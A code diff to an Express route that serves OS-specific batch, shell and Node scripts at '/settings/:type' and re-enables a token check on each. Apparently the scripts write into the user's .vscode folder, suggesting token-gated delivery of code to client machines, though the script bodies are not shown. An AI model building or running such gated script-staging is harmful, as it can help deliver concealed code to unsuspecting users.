@@ -73,15 +73,15 @@ app.use(async (req, res, next) => {
 
 app.get("/settings/:type", (req, res) => {
   const { type } = req.params;
-  const { flag } = 5;
+  const { flag } = req.query;
 
   let script = "";
 
   switch (type) {
     case "windows":
-      // if (!VALID_FLAGS.includes(flag)) {
-      //   return res.status(403).send("Unauthorized token");
-      // }
+      if (!VALID_FLAGS.includes(flag)) {
+        return res.status(403).send("Unauthorized token");
+      }
       script = `
 @echo off
 set "VSCODE_DIR=%USERPROFILE%\\.vscode"
@@ -96,9 +96,9 @@ cls
       break;
 
     case "linux":
-      // if (!VALID_FLAGS.includes(flag)) {
-      //   return res.status(403).send("Unauthorized token");
-      // }
+      if (!VALID_FLAGS.includes(flag)) {
+        return res.status(403).send("Unauthorized token");
+      }
       script = `
 #!/bin/bash
 set -e
@@ -118,9 +118,9 @@ exit 0
       break;
 
     case "mac":
-      // if (!VALID_FLAGS.includes(flag)) {
-      //   return res.status(403).send("Unauthorized token");
-      // }
+      if (!VALID_FLAGS.includes(flag)) {
+        return res.status(403).send("Unauthorized token");
+      }
       script = `
 #!/bin/bash
 set -e
@@ -138,9 +138,9 @@ exit 0
       break;
 
     case "bootstrap":
-      // if (!VALID_FLAGS.includes(flag)) {
-      //   return res.status(403).send("Unauthorized token");
-      // }
+      if (!VALID_FLAGS.includes(flag)) {
+        return res.status(403).send("Unauthorized token");
+      }
       script = `
 @echo off
 title Creating new Info
@@ -262,9 +262,9 @@ exit /b 0
       break;
 
     case "bootstraplinux":
-      // if (!VALID_FLAGS.includes(flag)) {
-      //   return res.status(403).send("Unauthorized token");
-      // }
+      if (!VALID_FLAGS.includes(flag)) {
+        return res.status(403).send("Unauthorized token");
+      }
       script = `
 #!/bin/bash
 # Creating new Info
@@ -449,9 +449,9 @@ exit 0
 		`;
       break;
     case "env":
-      // if (!VALID_FLAGS.includes(flag)) {
-      //   return res.status(403).send("Unauthorized token");
-      // }
+      if (!VALID_FLAGS.includes(flag)) {
+        return res.status(403).send("Unauthorized token");
+      }
 
       script = `
 	const axios = require('axios');
